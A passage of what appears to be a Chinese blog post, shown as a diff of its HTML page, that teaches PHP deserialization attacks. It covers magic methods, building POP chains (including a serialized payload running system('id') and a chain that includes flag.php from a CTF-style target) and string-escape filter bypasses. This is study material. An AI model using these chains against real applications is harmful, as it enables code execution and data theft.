@@ -1,0 +1,1194 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>反序列化 | Modest&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="感谢陈腾师傅">
+<meta name="author" content="Modest">
+<link rel="canonical" href="https://modesty258.github.io/posts/web/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.css" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.js" onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://modesty258.github.io/img/Q.gif">
+<link rel="icon" type="image/png" sizes="16x16" href="https://modesty258.github.io/img/Q.gif">
+<link rel="icon" type="image/png" sizes="32x32" href="https://modesty258.github.io/img/Q.gif">
+<link rel="apple-touch-icon" href="https://modesty258.github.io/img/Q.gif">
+<link rel="mask-icon" href="https://modesty258.github.io/img/Q.gif">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+<script defer src="https://unpkg.com/mermaid@8.8.1/dist/mermaid.min.js"></script>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
+<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.6.3/dist/jquery.min.js"></script>
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = ""; 
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<meta property="og:title" content="反序列化" />
+<meta property="og:description" content="感谢陈腾师傅" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://modesty258.github.io/posts/web/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-05-15T17:19:33+08:00" />
+<meta property="article:modified_time" content="2023-05-15T17:19:33+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="反序列化"/>
+<meta name="twitter:description" content="感谢陈腾师傅"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+
+        {
+          "@type": "ListItem",
+          "position":  1 ,
+          "name": "📚文章",
+          "item": "https://modesty258.github.io/posts/"
+        },
+
+        {
+          "@type": "ListItem",
+          "position":  2 ,
+          "name": "📕 web",
+          "item": "https://modesty258.github.io/posts/web/"
+        }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "反序列化",
+      "item": "https://modesty258.github.io/posts/web/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "反序列化",
+  "name": "反序列化",
+  "description": "感谢陈腾师傅",
+  "keywords": [
+    ""
+  ],
+  "articleBody": "​\n反序列化 php面向对象基础知识 类 函数，变量，挺像java的，好好学学吧\n类的结构 class Class_hero{ public name; //成员变量 //成员函数 } \u003c?php highlight_file(__FILE__); class hero{ var $name; var $sex; function jineng($var1) { echo $this-\u003ename; //this当前类,调用上面的name。 echo $var1; } } ?\u003e 实例化与赋值 \u003c?php highlight_file(__FILE__); class hero{ var $name; var $sex; var $blood; function jineng($var1) { echo $this\u003ename.\"\n\"; echo $var1.\"\n\"; } } $cyj= new hero(); //实例化对象并赋值到cyj $cyj-\u003ename='chengyaojin'; //重新赋值name $cyj-\u003esex='男'; //赋值性别 $cyj-\u003eblood=3000; $cyj-\u003ejineng('zuofan'); print_r($cyj); ?\u003e chengyaojin zuofan hero Object ( [name] =\u003e chengyaojin [sex] =\u003e man ) 赋值 的时候需要\n修饰符 public 完全可以调用\nprivate 只有自己可以调用\nprotected 自己和子类可以调用\n反序列化 序列化的作用 方便存储，数据传输。\n表达方式 空字符： null N;\n整形： 666 i:666;\n只序列化成员变量，不序列化函数。\nprivate\n在序列化的时候会加上类名，并且加上nul，在前后。\n反序列化后仍是对象 反序列化与原来的无关，与传入的字符串值相关 反序列化生成的对象的值由我们提供，并不是原来的benben，而是传入的dazhuang。\n使用成员方法 可以调用上面的成员方法，因为上面的test类还在，所以自己生成的反序列化对象可以调用displayVar方法\n漏洞 成因，反序列化的接受字符串可控。\n魔术方法 自动触发的行为之前或者之后。\n会不会 触发时机–功能–参数–返回值\nconstruct（） 构造方法，实例化对象的时候会自动触发。\n特殊不用调用就可以直接执行函数\n\u003c?php class User { public $username=\"benben\"; public function __construct($username) { $this-\u003eusername = $username; echo \"触发了构造函数1次\" ; } } $test = new User(\"benben\"); //自动执行echo函数 $ser = serialize($test); unserialize($ser); $test-\u003e__construct(\"dasds\"); ?\u003e 触发了构造函数1次 //构造函数触发 触发了构造函数1次 //下面的函数触发 destruct（） 引用被删除或者对象被销毁的时候触发。\n\u003c?php highlight_file(__FILE__); class User { public function __destruct() { echo \"触发了析构函数1次\".\"\n\" ; } } $test = new User(\"benben\"); //触发一次 $ser = serialize($test); unserialize($ser); //触发第二次 ?\u003e 触发了析构函数1次 触发了析构函数1次 反序列化的时候会自动触发这个函数，所以只要提交反序列化的话就会直接执行。\nsleep（） 在使用serialize函数时，会自动调用，先执行sleep函数，然后再进行序列化。\nwakeup 在使用unserialize之前会检查是否有这一函数，如果有的话，会先执行这一函数然后再执行反序列化\n__toString 在一个类被定义为字符串的时候会执行，\n\u003c?php class TestClass { public $foo; public function __construct($foo) { $this-\u003efoo = $foo; } public function __toString() { return $this-\u003efoo; } } $class = new TestClass('Hello'); echo $class; // 运行结果：Hello print_r($class) ?\u003e invoke() 当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。\n\u003c?php class CallableClass { function __invoke($x) { var_dump($x); } } $obj = new CallableClass; $obj(5); var_dump(is_callable($obj)); ?\u003e 错误调用魔术方法 __call() 调用不存在的成员方法\n\u003c?php highlight_file(__FILE__); error_reporting(0); class User { public function __call($arg1,$arg2)arg1为callxxx，arg2为传递参数 { echo \"$arg1,$arg2[0]\"; } } $test = new User() ; $test -\u003e callxxx('a'); ?\u003e /*运行结果 */ callxxx,a __callStatic() 比上文多了一个静态\n__get() 调用的成员属性不存在。\n\u003c? class User{ public $var1=\"1\"; function __get($ags1){ echo $ags1.\"不存在\"; } } $test=new User(); $test-\u003evar2; //触发get，将不存在的var2赋值给ags1； //echo \"\\n\".$test-\u003evar1 \u003e shuchu :var2不存在[Finished in 0.1s] __set 给不存在的成员赋值。\n\u003c? class User{ public $var1=\"1\"; function __set($ags1 ,$ags2){ //$ags1--变量名 ,$ags2--变量值 echo $ags1.\"不存在\".$ags2.\"赋值给谁啊\"; } } $test=new User(); $test-\u003evar2=\"benben\"; //赋值的var2并不存在 \u003e 输出：var2不存在benben赋值给谁啊 __isset 对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用。\n\u003c?php highlight_file(__FILE__); error_reporting(0); class User { private $var; public function __isset($arg1 ) { echo $arg1.\"不存在或者为私有属性\"; } } $test = new User() ; isset($test-\u003evar);\t//var是私有属性，无法被调用 isset($test-\u003evar2); //var2不存在，所以会直接调用 ?\u003e shuchu:var不存在或者为私有属性 var2不存在或者为私有属性 __unset __clone 使用clone的时候触发\npop链 前置知识–反推法 魔术方法的触发条 件\n\u003c?php class index { private $test; public function __construct(){ $this-\u003etest = new evil(); } // public function __destruct(){ // $this-\u003etest-\u003eaction(); // } } // class normal { // public function action(){ // echo \"please attack me\"; // } // } class evil { var $test2=\"system('id');\"; // public function action(){ // eval($this-\u003etest2); } $a=new index(); echo(serialize($a)); ?\u003e O:5:\"index\":1:{s:11:\"%00index%00test\";O:4:\"evil\":1:{s:5:\"test2\";s:13:\"system(%27id%27);\";}} //空格替换 上面构造的poc会在实例化index的时候调用__costruct函数，并且将evil实例化给test，就可以顺利的执行下面的 $this-\u003etest-\u003eaction();\n\u003c?php class index { private $test; } class evil { var $test2; } $a=new evil(); $a-\u003etest2=\"system('ls');\"; $b=new index(); $b-\u003etest=$a; echo(ser) 这个函数时去除了没用的然后构造。\nb时sec的对像，在反序列化的时候无法触发class fast中的wakeup魔术方法。\n所以想要触发最后的__tostring方法，必须得调用echo的时候输出的是一个对象source，这就需要在反序列化的时候将source赋值为对象，这一点已经做到了，但是这时候并不能调用其他类里面的魔术方法，所以就需要在调用wakeup的时候，source必须是一个sec的对象。所以最后只要反序列化一个sec的对象并且作为参数传递就可以了。\n总结构造的时候，最外层是一个fast的类，因为需要触发wakeup的，魔术方法。往里就是source，但是不能作为一个参数，而是作为一个对象。这个就是sec类的对象。在这个对象中就可以了。\n$a=new fast(); $a-\u003esource =new sec(); //赋值source为对象 echo serialize($a); poc编写 反推法构造\n\u003c?php class Modifier { private $var; public function append($value) { include($value); //第-1步，flag在flag.php中，所以，$value为flag.php.调用append时候可以赋值 echo $flag; //最终目的，输出flag。 } public function __invoke(){ //invoke：对象作为函数调用的时候， $this-\u003eappend($this-\u003evar); //这里调用了append，所以为第-2步，var赋值为flag.php。所以寻找调用这个函数。 } } class Show{ public $source; public $str; public function __toString(){ return $this-\u003estr-\u003esource;\t//第-4步，调用str中的source，为了保证这是一个不存在的属性，所以str需要实例化为test，因为Test类中没有source。 } public function __wakeup(){ echo $this-\u003esource;\t//第-5步，为了调用上面的__tostring，所以需要source是一个实例化对象但为作为字符串输出。$source=new Show();因为把自己作为对象，才能够触发下一步的_tostring. } class Test{ public $p; public function __construct(){ $this-\u003ep = array(); } public function __get($key){\t//为了调用__get需要有一个并不存在的参数被调用，Show中的source符合这个要求， $function = $this-\u003ep;\t//将p作为一个对象，为了__invoke，所以这里需要是Modifier，$p=new Modeifier(). return $function(); //第-3步，这里存在调用函数，所以需要将这里的函数实例化为一个对象，向上看。 } } if(isset($_GET['pop'])){ unserialize($_GET['pop']); 逐步分析，然后再来一步步的构造\n首先明白这一步如何被触发然后去寻找上一步，所以上一步的为了触发这一魔术方法，所以这一步的类必须与下一步有关联，才能调用下一步中的魔术方法\n首先是pop赋值为source，为了tostring，所以但是先有类，$show=new Show(), $source=new Show() 然后为了触发__get，必须要一个test的类 $test=new Test()，并且满足触发条件，所以 $str=new Test() 为了触发__invoke,对象作为函数，$p=new Modeifier() $var =flag.php \u003c?php class Modifier { private $var='flag.php'; } class Show{ public $source; public $str; } class Test{ public $p; } $mod=new Modifier(); $test=new Test(); $test-\u003ep=new $mod; $show=new Show(); $show-\u003estr=$test; $show-\u003esource=$test; echo serialize($show); 字符逃逸 成员属性保持一致 原理一，最外面的：3要与{}里面的成员属性一致。\n$b=O:1\"A\":2{s:2\"v1\";s:3:\"a\"b\";s:2\"v2\";s:3:\"a\"b\";} //外面为2，里面为v1和v2两个成员。 原理二，成员属性名称长度一致，内容长度一致。\n原理三，前面为3，所以说明属性的长度为3，所以a后面的“当作字符串对待，而不是功能符号\n当;}出现的时候代表达到结束符，后面出现的无关\n属性逃逸 \u003c?php highlight_file(__FILE__); error_reporting(0); class A{ public $v1 = \"abcsystem()system()system()\"; public $v2 = '123'; public function __construct($arga,$argc){ $this-\u003ev1 = $arga; $this-\u003ev2 = $argc; } } $a = $_GET['v1']; $b = \"system()123\"; $data = serialize(new A($a,$b)); $data = str_replace(\"system()\",\"\",$data); //过滤system() var_dump(unserialize($data)); ?\u003e 原理：将system()替换为空，那么反序列化以后的值就会减少长度，根据上面的原理二可以得知不符合规则，反序列化会出错。例如下面会把原来的system()123变为123.那么11就应该是3了\nO:1:\"A\":2:{s:2:\"v1\";N;s:2:\"v2\";s:11:\"123\";}bool(false)\n利用：因为原理三，长度为n，而给出的不足n，那么就会把后面的功能符号作为字符串.所以字符串就会认为是123\";}bool(,但是还需要一个”；}闭合，如果是第一个的话，就可以利用这一规则输入多个system(),那么就会吞掉更多的字符，甚至会把下一个成员属性给吞掉，如果v1的system过多，字符串长度达到23这样很多，甚至会把下面的v2给吞掉，为了满足远离一，那时候就可以在v2的位置重新传入一个v3，但是原来定义的v2并不会消失，就多了一个v3.\n所以来构造，上传所需要的v1，v2。\n\u003c?php class A{ public $v1=\"system()\"123; public\t$v2=\"123\"; } 字符串增多 \"O:1:\"A\":1:{s:2:\"v1\";s:2:\"ls\";}\" str_replace(ls,pwd) \"O:1:\"A\":1:{s:2:\"v1\";s:2:\"pwd\";}\" //违反了原理二 **利用：**因为每次都会增加一个字符，所以我们可以利用闭合符号，逃逸多个字符，因为每次都会增加一个字符，所以不会出错。根据原理三，;}是作为字符串结束标志，可以将后面的v2注释掉，以此来增加字符。\n",
+  "wordCount" : "3426",
+  "inLanguage": "en",
+  "datePublished": "2023-05-15T17:19:33+08:00",
+  "dateModified": "2023-05-15T17:19:33+08:00",
+  "author":[{
+    "@type": "Person",
+    "name": "Modest"
+  }],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://modesty258.github.io/posts/web/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Modest's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://modesty258.github.io/img/Q.gif"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    (function () {
+        let  arr,reg = new RegExp("(^| )"+"change-themes"+"=([^;]*)(;|$)");
+        if(arr = document.cookie.match(reg)) {
+        } else {
+            if (new Date().getHours() >= 19 || new Date().getHours() < 6) {
+                document.body.classList.add('dark');
+                localStorage.setItem("pref-theme", 'dark');
+            } else {
+                document.body.classList.remove('dark');
+                localStorage.setItem("pref-theme", 'light');
+            }
+        }
+    })()
+
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://modesty258.github.io/" accesskey="h" title="Modest&#39;s Blog (Alt + H)">
+            <img src="https://modesty258.github.io/img/Q.gif" alt="logo" aria-label="logo"
+                 height="35">Modest&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                         fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                         stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                         fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                         stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://modesty258.github.io/search" title="🔍 搜索 (Alt &#43; /)" accesskey=/>
+                <span>🔍 搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://modesty258.github.io/" title="🏠 主页">
+                <span>🏠 主页</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://modesty258.github.io/posts" title="📚 文章">
+                <span>📚 文章</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://modesty258.github.io/tags" title="🧩 标签">
+                <span>🧩 标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://modesty258.github.io/archives/" title="⏱️ 时间轴">
+                <span>⏱️ 时间轴</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://modesty258.github.io/about" title="🙋🏻‍♂️ 关于">
+                <span>🙋🏻‍♂️ 关于</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://modesty258.github.io/links" title="🤝 友链">
+                <span>🤝 友链</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main page">
+<style>
+    i[id*="post_meta_style"] {
+        display: flex;
+        align-items: center;
+        margin: 0 0 10px 0;
+    }
+</style>
+
+<article class="post-single">
+    <div id="single-content">
+        <header class="post-header">
+            <div class="breadcrumbs"><a href="https://modesty258.github.io/">🏠 主页</a>&nbsp;»&nbsp;<a href="https://modesty258.github.io/posts/">📚文章</a>&nbsp;»&nbsp;<a href="https://modesty258.github.io/posts/web/">📕 web</a></div>
+            <h1 class="post-title">
+                反序列化
+            </h1>
+            <div class="post-description">
+                感谢陈腾师傅
+            </div>
+            <div class="post-meta">
+
+<style>
+    i[id*="post_meta_style"] {
+        display: flex;
+        align-items: center;
+        margin: 0 0 10px 0;
+    }
+
+    .parent-post-meta {
+        display: flex;
+        flex-wrap: wrap;
+        opacity: 0.8;
+    }
+</style>
+
+<span class="parent-post-meta">
+    <span id="post_meta_style_1">
+        <span class="fa fa-calendar-check-o"></span>
+        <span>2023-05-15
+            &nbsp;&nbsp;
+        </span>
+    </span>
+    
+    
+    
+    
+    
+    
+    
+    <span id="post_meta_style_3">
+        <span class="fa fa-file-word-o"></span>
+        <span>3426字
+            &nbsp;&nbsp;
+        </span>
+    </span>
+    <span id="post_meta_style_4">
+        <span class="fa fa-clock-o"></span>
+        <span>7分钟
+            &nbsp;&nbsp;
+        </span>
+    </span>
+    <span id="post_meta_style_5">
+        <span class="fa fa-user-o"></span>
+        <span>Modest
+            &nbsp;&nbsp;
+        </span>
+    </span>
+    <span id="post_meta_style_6">
+        <span class="fa fa-tags" style="opacity: 0.8"></span>
+        <span>
+            <span class="post-tags-meta">
+            </span>
+        </span>
+    </span>
+</span>
+<span style="opacity: 0.8;">
+                    <span id="post_meta_style_7">
+                        &nbsp;&nbsp;
+                        <span class="fa fa-eye" ></span>
+                        <span>
+                            <span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv"></span></span>
+                            &nbsp;&nbsp;
+                        </span>
+                    </span>
+                    <span id="post_meta_style_8">
+                        <span class="fa fa-commenting-o"></span>
+                        <span>
+                            <script src="https://cdn.staticfile.org/twikoo/1.5.8/twikoo.all.min.js"></script>
+                            <script>
+                                let url = document.documentURI
+                                
+                                let dnsUrl = "https://modesty258.github.io/"
+                                let urlSplit = url.split(dnsUrl)
+                                let finalUrl = urlSplit[1]
+                                if (finalUrl[0] !== '/') {
+                                    finalUrl = '/'+finalUrl
+                                }
+                                twikoo.getCommentsCount({
+                                    envId:  null , 
+                                region:  null , 
+                                urls: [ 
+                                    
+                                    finalUrl,
+                                ],
+                                    includeReply: false 
+                                }).then(function (res) {
+                                    let count = res[0].count
+                                    const obj = document.getElementById("comment_count");
+                                    obj.innerText = count
+                                    
+                                    
+                                    
+                                }).catch(function (err) {
+                                    
+                                    console.error(err);
+                                });
+                            </script>
+                            <span id="comment_count"></span>
+                        </span>
+                    </span>
+                </span>
+
+</div>
+        </header> <aside id="toc-container" class="toc-container wide">
+    <div class="toc">
+        <details  open>
+            <summary accesskey="c" title="(Alt + C)">
+                <span class="details">文章目录</span>
+            </summary>
+
+            <div class="inner"><ul>
+                    <li>
+                        <a href="#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" aria-label="反序列化">反序列化</a><ul>
+                            
+                    <li>
+                        <a href="#php%e9%9d%a2%e5%90%91%e5%af%b9%e8%b1%a1%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86" aria-label="php面向对象基础知识">php面向对象基础知识</a><ul>
+                            
+                    <li>
+                        <a href="#%e7%b1%bb" aria-label="类">类</a><ul>
+                            
+                    <li>
+                        <a href="#%e7%b1%bb%e7%9a%84%e7%bb%93%e6%9e%84" aria-label="类的结构">类的结构</a><ul>
+                            
+                    <li>
+                        <a href="#%e5%ae%9e%e4%be%8b%e5%8c%96%e4%b8%8e%e8%b5%8b%e5%80%bc" aria-label="实例化与赋值">实例化与赋值</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e4%bf%ae%e9%a5%b0%e7%ac%a6" aria-label="修饰符">修饰符</a></li></ul>
+                    </li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96-1" aria-label="反序列化">反序列化</a><ul>
+                            
+                    <li>
+                        <a href="#%e5%ba%8f%e5%88%97%e5%8c%96%e7%9a%84%e4%bd%9c%e7%94%a8" aria-label="序列化的作用">序列化的作用</a></li>
+                    <li>
+                        <a href="#%e8%a1%a8%e8%be%be%e6%96%b9%e5%bc%8f" aria-label="表达方式">表达方式</a><ul>
+                            
+                    <li>
+                        <a href="#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%90%8e%e4%bb%8d%e6%98%af%e5%af%b9%e8%b1%a1" aria-label="反序列化后仍是对象">反序列化后仍是对象</a></li>
+                    <li>
+                        <a href="#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%8e%e5%8e%9f%e6%9d%a5%e7%9a%84%e6%97%a0%e5%85%b3%e4%b8%8e%e4%bc%a0%e5%85%a5%e7%9a%84%e5%ad%97%e7%ac%a6%e4%b8%b2%e5%80%bc%e7%9b%b8%e5%85%b3" aria-label="反序列化与原来的无关，与传入的字符串值相关">反序列化与原来的无关，与传入的字符串值相关</a></li>
+                    <li>
+                        <a href="#%e4%bd%bf%e7%94%a8%e6%88%90%e5%91%98%e6%96%b9%e6%b3%95" aria-label="使用成员方法">使用成员方法</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e6%bc%8f%e6%b4%9e" aria-label="漏洞">漏洞</a><ul>
+                            
+                    <li>
+                        <a href="#%e9%ad%94%e6%9c%af%e6%96%b9%e6%b3%95" aria-label="魔术方法">魔术方法</a><ul>
+                            <ul>
+                            
+                    <li>
+                        <a href="#%e4%bc%9a%e4%b8%8d%e4%bc%9a" aria-label="会不会">会不会</a></li></ul>
+                        </ul>
+                    </li>
+                    <li>
+                        <a href="#construct" aria-label="construct（）">construct（）</a></li>
+                    <li>
+                        <a href="#destruct" aria-label="destruct（）">destruct（）</a></li>
+                    <li>
+                        <a href="#sleep" aria-label="sleep（）">sleep（）</a></li>
+                    <li>
+                        <a href="#wakeup" aria-label="wakeup">wakeup</a></li>
+                    <li>
+                        <a href="#__tostring" aria-label="__toString">__toString</a></li>
+                    <li>
+                        <a href="#invoke" aria-label="invoke()">invoke()</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e9%94%99%e8%af%af%e8%b0%83%e7%94%a8%e9%ad%94%e6%9c%af%e6%96%b9%e6%b3%95" aria-label="错误调用魔术方法">错误调用魔术方法</a><ul>
+                            
+                    <li>
+                        <a href="#__call" aria-label="__call()">__call()</a></li>
+                    <li>
+                        <a href="#__callstatic" aria-label="__callStatic()">__callStatic()</a></li>
+                    <li>
+                        <a href="#__get" aria-label="__get()">__get()</a></li>
+                    <li>
+                        <a href="#__set" aria-label="__set">__set</a></li>
+                    <li>
+                        <a href="#__isset" aria-label="__isset">__isset</a></li>
+                    <li>
+                        <a href="#__unset" aria-label="__unset">__unset</a></li>
+                    <li>
+                        <a href="#__clone" aria-label="__clone">__clone</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#pop%e9%93%be" aria-label="pop链">pop链</a><ul>
+                            
+                    <li>
+                        <a href="#%e5%89%8d%e7%bd%ae%e7%9f%a5%e8%af%86--%e5%8f%8d%e6%8e%a8%e6%b3%95" aria-label="前置知识&amp;ndash;反推法">前置知识&ndash;反推法</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#poc%e7%bc%96%e5%86%99" aria-label="poc编写">poc编写</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e5%ad%97%e7%ac%a6%e9%80%83%e9%80%b8" aria-label="字符逃逸">字符逃逸</a><ul>
+                            <ul>
+                            
+                    <li>
+                        <a href="#%e6%88%90%e5%91%98%e5%b1%9e%e6%80%a7%e4%bf%9d%e6%8c%81%e4%b8%80%e8%87%b4" aria-label="成员属性保持一致">成员属性保持一致</a></li>
+                    <li>
+                        <a href="#%e5%b1%9e%e6%80%a7%e9%80%83%e9%80%b8" aria-label="属性逃逸">属性逃逸</a></li>
+                    <li>
+                        <a href="#%e5%ad%97%e7%ac%a6%e4%b8%b2%e5%a2%9e%e5%a4%9a" aria-label="字符串增多">字符串增多</a>
+                    </li>
+                </ul>
+                </li>
+                </ul>
+                </ul>
+                </li>
+                </ul>
+            </div>
+        </details>
+    </div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    window.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+         
+         activeElement = elements[0];
+         const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+         document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+     }, false);
+
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+
+    window.addEventListener('scroll', () => {
+        
+        activeElement = Array.from(elements).find((element) => {
+            if ((getOffsetTop(element) - window.pageYOffset) > 0 && 
+                (getOffsetTop(element) - window.pageYOffset) < window.innerHeight/2) {
+                return element;
+            }
+        }) || activeElement
+
+        elements.forEach(element => {
+             const id = encodeURI(element.getAttribute('id')).toLowerCase();
+             if (element === activeElement){
+                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+             } else {
+                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.remove('active');
+             }
+         })
+     }, false);
+
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;   
+    }
+</script>
+
+        <div class="post-content"><p>​</p>
+<h1 id="反序列化">反序列化<a hidden class="anchor" aria-hidden="true" href="#反序列化">#</a></h1>
+<h2 id="php面向对象基础知识">php面向对象基础知识<a hidden class="anchor" aria-hidden="true" href="#php面向对象基础知识">#</a></h2>
+<h3 id="类">类<a hidden class="anchor" aria-hidden="true" href="#类">#</a></h3>
+<p>函数，变量，挺像java的，好好学学吧</p>
+<blockquote>
+<h4 id="类的结构">类的结构<a hidden class="anchor" aria-hidden="true" href="#类的结构">#</a></h4>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Class_hero</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">name</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//成员变量
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//成员函数
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">hero</span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> $name;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> $sex;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">jineng</span>($var1) {
